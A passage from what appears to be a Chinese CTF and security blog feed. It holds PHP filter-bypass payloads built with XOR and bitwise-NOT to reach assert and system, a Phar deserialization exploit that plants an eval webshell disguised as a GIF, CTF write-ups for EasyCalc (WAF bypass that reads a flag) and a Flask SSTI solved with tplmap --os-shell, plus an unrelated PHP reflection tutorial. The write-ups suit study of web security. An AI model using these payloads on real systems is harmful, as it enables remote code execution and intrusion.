<span class="token keyword">for</span> char <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> strlist<span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> strlist<span class="token punctuation">:</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">^</span> j <span class="token operator">==</span> ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                i <span class="token operator">=</span> <span class="token string">'%{:0>2}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                j <span class="token operator">=</span> <span class="token string">'%{:0>2}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"('{0}'^'{1}')"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">"."</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">break</span></code></pre>
<p>一次代码执行只能得到我们想要执行语句的字符串，并不能执行语句，所以需要执行两次代码执行，构造</p>
<pre><code>assert($_GET[_]);</code></pre>
<p>使用脚本对每个字母进行转换，然后拼接</p>
<pre><code>$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');
//$_='assert';
$__='_'.('%07'^'%40').('%05'^'%40').('%09'^'%5d');
//$__='_GET';
$___=$$__;
//$___='$_GET';
$_($___[_]);
//assert($_GET[_]);</code></pre>
<p>payload</p>
<pre><code>$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');$__='_'.('%07'^'%40').('%05'^'%40').('%09'^'%5d');$___=$$__;$_($___[_]);&amp;_=phpinfo();</code></pre>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005559983.png" alt="22"><br>经本地测试，发现这种方法可以在<code>php5</code>以及<code>php7.0.9</code>版本种使用，因为assert()的问题，并不是异或不能使用<br>注：PHP5低版本有些可能因为magic_quotes_gpc开启的关系导致无法利用<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005611583.png" alt="23"><br>当过滤字符的范围没有那么大，或者只是过滤关键字的时候可以使用如下脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>

<span class="token keyword">import</span> string

char <span class="token operator">=</span> string<span class="token punctuation">.</span>printable
cmd <span class="token operator">=</span> <span class="token string">'system'</span>
tmp1<span class="token punctuation">,</span>tmp2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>
<span class="token keyword">for</span> res <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> char<span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> char<span class="token punctuation">:</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> ord<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                tmp1 <span class="token operator">+=</span> i
                tmp2 <span class="token operator">+=</span> j
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"('{}'^'{}')"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span>tmp2<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<pre><code>PS C:\Users\Administrator&gt; php -r "var_dump('000000'^'CICDU]');"
Command line code:1:
string(6) "system"</code></pre>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005741747.png" alt="24"><br>再放个网上看到的payload</p>
<pre><code>${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo
//${_GET}{%ff}();&amp;%ff=phpinfo</code></pre>
<h3 id="URL编码取反绕过"><a href="#URL编码取反绕过" class="headerlink" title="URL编码取反绕过"></a>URL编码取反绕过</h3><pre><code>适用PHP版本：无限制</code></pre>
<p>还是上面那个例题<br>当PHP&gt;=7时，可以直接利用取反构造payload</p>
<pre><code>PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'phpinfo'));"
Command line code:1:
string(21) "%8F%97%8F%96%91%99%90"</code></pre>
<pre><code>(~%8F%97%8F%96%91%99%90)();
#phpinfo();</code></pre>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005814900.png" alt="25"><br>有参数的</p>
<pre><code>PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'system'));"
Command line code:1:
string(18) "%8C%86%8C%8B%9A%92"
PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'whoami'));"
Command line code:1:
string(18) "%88%97%90%9E%92%96"</code></pre>
<p>payload</p>
<pre><code>(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);
#system('whoami');</code></pre>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005839305.png" alt="26"></p>
<p>当<code>5&lt;=PHP&lt;=7.0.9</code>时，需要再执行一次构造出来的字符，所以参考上面那种<code>异或拼接</code>的方法</p>
<pre><code>$_=(~'%9E%8C%8C%9A%8D%8B');$__='_'.(~'%AF%B0%AC%AB');$___=$$__;$_($___[_]);
#assert($_POST[_]);</code></pre>
<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005919729.png" alt="27"></p>
]]></content>
  </entry>
  <entry>
    <title>Phar原理及利用</title>
    <url>/2021/07/23/phar-yuan-li-ji-li-yong/</url>
    <content><![CDATA[<h2 id="流包装"><a href="#流包装" class="headerlink" title="流包装"></a>流包装</h2><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br> 例如常见的</p>
<pre><code>include('php://filter/read=convert.base64-encode/resource=index.php');
include('data://text/plain;base64,xxxxxxxxxxxx');</code></pre>
<p><code>phar://</code>也是流包装的一种</p>
<h2 id="phar原理"><a href="#phar原理" class="headerlink" title="phar原理"></a>phar原理</h2><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>压缩文件的属性等信息，以序列化存储。</p>
<h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p>压缩文件的内容。</p>
<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>签名，放在文件末尾。</p>
<h2 id="官方手册"><a href="#官方手册" class="headerlink" title="官方手册"></a>官方手册</h2><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p>
<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
<p>假设有test.php:</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">Testobj</span>
<span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">"echo 'ok';"</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>生成phar的test.phar:</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">Testobject</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//删除之前的test.par文件(如果有)</span>
    <span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//创建一个phar对象，文件名必须以phar为后缀</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//开始写文件</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//写入stub</span>
    <span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Testobject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span><span class="token string">'eval($_GET["a"]);'</span><span class="token punctuation">;</span>  
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//添加要压缩的文件</span>
    <span class="token comment" spellcheck="true">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>这样，当我们访问phar.phpr时，将会生成test.phar的phar文件。之后再将其作为参数传到test.php中，就可getshell</p>
<p>用winhex打开test.phar:</p>
<p><img src="/2021/07/23/phar-yuan-li-ji-li-yong/image-20210723025024180.png" alt="image-20210723025024180"></p>
<p>看到meta-data是以序列化的形式存储的</p>
<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<p><img src="/2021/07/23/phar-yuan-li-ji-li-yong/image-20210723025147550.png" alt="image-20210723025147550"></p>
<h2 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h2><p>php识别__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">Testobject</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">var</span> <span class="token variable">$output</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//删除之前的test.par文件(如果有)</span>
    <span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//创建一个phar对象，文件名必须以phar为后缀</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//开始写文件</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置stub，增加gif文件头</span>
    <span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Testobject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span><span class="token string">'eval($_GET["a"]);'</span><span class="token punctuation">;</span>  
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>phar文件要能够上传到服务器端</li>
<li>要有可用的魔术方法作为“跳板”</li>
<li>要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file()</li>
<li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox">CISCN:2019-华北赛区-Dropbox</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><strong>文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；</strong></li>
<li><strong>反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。</strong></li>
</ul>
<p>参考：<a href="https://blog.csdn.net/silence1_/article/details/102683254">https://blog.csdn.net/silence1_/article/details/102683254</a></p>
<p>​            <a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
]]></content>
  </entry>
  <entry>
    <title>PHP:镜像反射</title>
    <url>/2021/05/15/php-jing-xiang-fan-she/</url>
    <content><![CDATA[<h2 id="反射是什么？"><a href="#反射是什么？" class="headerlink" title="反射是什么？"></a>反射是什么？</h2><p>它是指在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。</p>
<p>其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。</p>
<p>PHP反射api由若干类组成，可帮助我们用来访问程序的元数据或者同相关的注释交互。借助反射我们可以获取诸如类实现了那些方法，创建一个类的实例（不同于用new创建），调用一个方法（也不同于常规调用），传递参数，动态调用类的静态方法。<br> 反射api是PHP内建的OOP技术扩展，包括一些类，异常和接口，综合使用他们可用来帮助我们分析其它类，接口，方法，属性，方法和扩展。这些OOP扩展被称为反射。</p>
<p>平常我们用的比较多的是 ReflectionClass类 和 ReflectionMethod类</p>
<pre><code>&lt;?php
class Person {


 /**
  * For the sake of demonstration, we"re setting this private
  */
 private $_allowDynamicAttributes = false;

 /**
  * type=primary_autoincrement
  */
 protected $id = 0;

 /**
  * type=varchar length=255 null
  */
 protected $name;

 /**
  * type=text null
  */
 protected $biography;
 public function getId() {
  return $this-&gt;id;
 }
 public function setId($v) {
  $this-&gt;id = $v;
 }
 public function getName() {
  return $this-&gt;name;
 }
 public function setName($v) {
  $this-&gt;name = $v;
 }
 public function getBiography() {
  return $this-&gt;biography;
 }
 public function setBiography($v) {
  $this-&gt;biography = $v;
 }
}</code></pre>
<p>一、通过ReflectionClass，我们可以得到Person类的以下信息：</p>
<p>1.常量 Contants<br> 2.属性 Property Names<br> 3.方法 Method Names静态<br> 4.属性 Static Properties<br> 5.命名空间 Namespace<br> 6.Person类是否为final或者abstract<br> 7.Person类是否有某个方法</p>
<p>接下来反射它，只要把类名”Person”传递给ReflectionClass就可以了：</p>
<p>代码如下:</p>
<pre><code>$class = new ReflectionClass('Person'); // 建立 Person这个类的反射类  
$instance  = $class-&gt;newInstanceArgs($args); // 相当于实例化Person 类 </code></pre>
<p>1）获取属性(Properties)：</p>
<p>代码如下:</p>
<pre><code>$properties = $class-&gt;getProperties();
foreach ($properties as $property) {
 echo $property-&gt;getName() . "\n";
}
// 输出:
// _allowDynamicAttributes
// id
// name
// biography</code></pre>
<p>默认情况下，ReflectionClass会获取到所有的属性，private 和 protected的也可以。如果只想获取到private属性，就要额外传个参数：</p>
<p>代码如下:</p>
<pre><code>$private_properties = $class-&gt;getProperties(ReflectionProperty::IS_PRIVATE);</code></pre>
<p>可用参数列表：</p>
<p>代码如下:</p>
<pre><code>ReflectionProperty::IS_STATIC
ReflectionProperty::IS_PUBLIC
ReflectionProperty::IS_PROTECTED
ReflectionProperty::IS_PRIVATE</code></pre>
<p>通过$property-&gt;getName()可以得到属性名。</p>
<p>2）获取注释：</p>
<p>通过getDocComment可以得到写给property的注释。</p>
<p>代码如下:</p>
<pre><code>foreach ($properties as $property) {
 if ($property-&gt;isProtected()) {
  $docblock = $property-&gt;getDocComment();
  preg_match('/ type\=([a-z_]*) /', $property-&gt;getDocComment(), $matches);
  echo $matches[1] . "\n";
 }
}
// Output:
// primary_autoincrement
// varchar
// text</code></pre>
<p>3）获取类的方法</p>
<p>代码如下:</p>
<pre><code>getMethods()       来获取到类的所有methods。
hasMethod(string)  是否存在某个方法
getMethod(string)  获取方法</code></pre>
<p>4）执行类的方法：</p>
<p>代码如下:</p>
<pre><code>$instance-&gt;getName(); // 执行Person 里的方法getName
// 或者：
$method = $class-&gt;getmethod('getName'); // 获取Person 类中的getName方法
$method-&gt;invoke($instance);    // 执行getName 方法
// 或者：
$method = $class-&gt;getmethod('setName'); // 获取Person 类中的setName方法
$method-&gt;invokeArgs($instance, array('snsgou.com'));</code></pre>
<p>二、通过ReflectionMethod，我们可以得到Person类的某个方法的信息：</p>
<p>1.是否“public”、“protected”、“private” 、“static”类型<br> 2.方法的参数列表<br> 3.方法的参数个数<br> 4.反调用类的方法</p>
<p>代码如下:</p>
<pre><code>// 执行detail方法
$method = new ReflectionMethod('Person', 'test');


if ($method-&gt;isPublic() &amp;&amp; !$method-&gt;isStatic()) {
 echo 'Action is right';
}
echo $method-&gt;getNumberOfParameters(); // 参数个数
echo $method-&gt;getParameters(); // 参数对象数组</code></pre>
<p><a href="https://blog.csdn.net/u013416034/article/details/105933637/">https://blog.csdn.net/u013416034/article/details/105933637/</a></p>
<p><a href="https://blog.csdn.net/luyaran/article/details/84339363">https://blog.csdn.net/luyaran/article/details/84339363</a></p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>RoarCTF:2019-EasyCalc</title>
    <url>/2021/06/11/roarctf-2019-easycalc/</url>
    <content><![CDATA[<p><img src="/2021/06/11/roarctf-2019-easycalc/image-20210611190653318.png" alt="image-20210611190653318"></p>
<pre><code>$('#calc').submit(function(){
   $.ajax({
       url:"calc.php?num="+encodeURIComponent($("#content").val()),
       type:'GET',
       success:function(data){
           $("#result").html(`&lt;div class="alert alert-success"&gt;
       &lt;strong&gt;答案:&lt;/strong&gt;${data}
       &lt;/div&gt;`);
       },
       error:function(){
           alert("这啥?算不来!");
       }
    })
    return false;
})</code></pre>
<p>$(“#content”).val() 是什么意思：</p>
<p> 获取id为content的HTML标签元素的值,是JQuery,   (“#content”)相当于document.getElementById(“content”);</p>
<p>(“#content”).val()相当于 document.getElementById(“content”).value;</p>
<p>但是无论怎么注入都是400,403和500</p>
<p>calc.php</p>
<pre><code>&lt;?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?&gt; </code></pre>
<p>HP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<p>1.删除空白符</p>
<p>2.将某些字符转换为下划线（包括空格）</p>
<p>waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<p>存在blacklist和preg_match过滤：用char()转ascii再进行拼接</p>
<p><img src="/2021/06/11/roarctf-2019-easycalc/image-20210611191802071.png" alt="image-20210611191802071"></p>
<pre><code>calc.php?%20num=var_dump(scandir(chr(47)))</code></pre>
<p><img src="/2021/06/11/roarctf-2019-easycalc/image-20210611192145718.png" alt="image-20210611192145718"></p>
<pre><code>calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></pre>
<p><img src="/2021/06/11/roarctf-2019-easycalc/image-20210611192231927.png" alt="image-20210611192231927"></p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>RoosterCTF：2019-I_&lt;3_Flask</title>
    <url>/2021/08/25/roosterctf-2019-i-3-flask/</url>
    <content><![CDATA[<p><img src="/2021/08/25/roosterctf-2019-i-3-flask/image-20210822224810737.png" alt="image-20210822224810737"></p>
<p>先用<a href="https://github.com/s0md3v/Arjun">Arjun</a>工具对可利用传参进行爆破：</p>
<pre class=" language-shell"><code class="language-shell">python3 arjun.py -u http://xxx.node3.buuoj.cn/  -m GET -c 200</code></pre>
<p>得到参数名：<code>name</code></p>
<pre class=" language-python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<p><img src="/2021/08/25/roosterctf-2019-i-3-flask/image-20210822224932908.png" alt="image-20210822224932908"></p>
<p>存在模版注入漏洞，使用<strong>tplmap</strong>进行扫描，这里注意安装</p>
<pre><code>pip2 install pyyaml</code></pre>
<pre><code>python2 tplmap.py -u http://9422d4e6-60bf-4b23-81a7-15c094f09a85.node4.buuoj.cn:81/?name=1</code></pre>
<p><img src="/2021/08/25/roosterctf-2019-i-3-flask/image-20210822230501352.png" alt="image-20210822230501352">得到返回结果：<code>Engine: Jinja2</code></p>
<pre><code>python2 tplmap.py -u http://9422d4e6-60bf-4b23-81a7-15c094f09a85.node4.buuoj.cn:81/?name=1 --os-shell</code></pre>
<p><img src="/2021/08/25/roosterctf-2019-i-3-flask/image-20210822230641085.png" alt="image-20210822230641085"></p>
]]></content>
  </entry>
  <entry>
    <title>SCTF：2020-FlagShop</title>
    <url>/2021/09/14/sctf-2020-flagshop/</url>
    <content><![CDATA[<p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914185600160.png" alt="image-20210914185600160"></p>
<h5 id="robots-txt"><a href="#robots-txt" class="headerlink" title="/robots.txt"></a>/robots.txt</h5><p><img src="/2021/09/14/sctf-2020-flagshop/image-20210914185546859.png" alt="image-20210914185546859"></p>
<h5 id="filebak"><a href="#filebak" class="headerlink" title="/filebak"></a>/filebak</h5><pre class=" language-ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string">'sinatra'</span>
<span class="token keyword">require</span> <span class="token string">'sinatra/cookies'</span>
<span class="token keyword">require</span> <span class="token string">'sinatra/json'</span>
<span class="token keyword">require</span> <span class="token string">'jwt'</span>
<span class="token keyword">require</span> <span class="token string">'securerandom'</span>
<span class="token keyword">require</span> <span class="token string">'erb'</span>

set <span class="token symbol">:public_folder</span><span class="token punctuation">,</span> <span class="token builtin">File</span><span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/static'</span>

<span class="token constant">FLAGPRICE</span> <span class="token operator">=</span> <span class="token number">1000000000000000000000000000</span>
<span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>

configure <span class="token keyword">do</span>
  enable <span class="token symbol">:logging</span>
  file <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/../log/http.log'</span><span class="token punctuation">,</span><span class="token string">"a+"</span><span class="token punctuation">)</span>
  file<span class="token punctuation">.</span>sync <span class="token operator">=</span> <span class="token keyword">true</span>
  use <span class="token constant">Rack</span><span class="token punctuation">:</span><span class="token symbol">:CommonLogger</span><span class="token punctuation">,</span> file
<span class="token keyword">end</span>

get <span class="token string">"/"</span> <span class="token keyword">do</span>
  redirect <span class="token string">'/shop'</span><span class="token punctuation">,</span> <span class="token number">302</span>
<span class="token keyword">end</span>

get <span class="token string">"/filebak"</span> <span class="token keyword">do</span>
  content_type <span class="token symbol">:text</span>
  erb <span class="token builtin">IO</span><span class="token punctuation">.</span>binread __FILE__
<span class="token keyword">end</span>

get <span class="token string">"/api/auth"</span> <span class="token keyword">do</span>
  payload <span class="token operator">=</span> <span class="token punctuation">{</span> uid<span class="token punctuation">:</span> <span class="token constant">SecureRandom</span><span class="token punctuation">.</span>uuid <span class="token punctuation">,</span> jkl<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">}</span>
  auth <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span>encode payload<span class="token punctuation">,</span><span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string">"SECRET"</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token string">'HS256'</span>
  cookies<span class="token punctuation">[</span><span class="token symbol">:auth</span><span class="token punctuation">]</span> <span class="token operator">=</span> auth
<span class="token keyword">end</span>

get <span class="token string">"/api/info"</span> <span class="token keyword">do</span>
  islogin
